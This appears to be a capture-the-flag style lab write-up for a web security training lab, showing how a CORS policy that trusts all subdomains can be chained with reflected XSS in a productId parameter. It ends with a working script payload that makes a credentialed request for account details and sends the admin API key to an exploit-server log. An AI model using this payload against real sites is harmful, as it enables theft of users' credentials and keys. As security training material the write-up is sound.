**Objective**
Reveal API key for administrator or *admin* account.

**CORS**
- Cross Origin Resource Sharing or CORS enables controlled access to data or resources between domains and sub-domains. 

**Point of Entry**
- Web application trusts all subdomains, which is a CORS vulnerability that can be exploited using Cross Site Scripting (XSS).
- GET /accountDetails response containing `Access-Control-Allow-Credentials` indicates CORS support.
- Adding `Origin: http://subdomain.lab-id` to GET /accountDetails request returns a `Access-Control-Allow-Origin`, confirming CORS support.
- As there is CORS support, an XSS vulnerability in productID parameter can be used as point of entry.

**Exploit to Enter**
- Host the following script on exploit server. When attack is successful, admin API key would appear in the log.
`<script> document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>`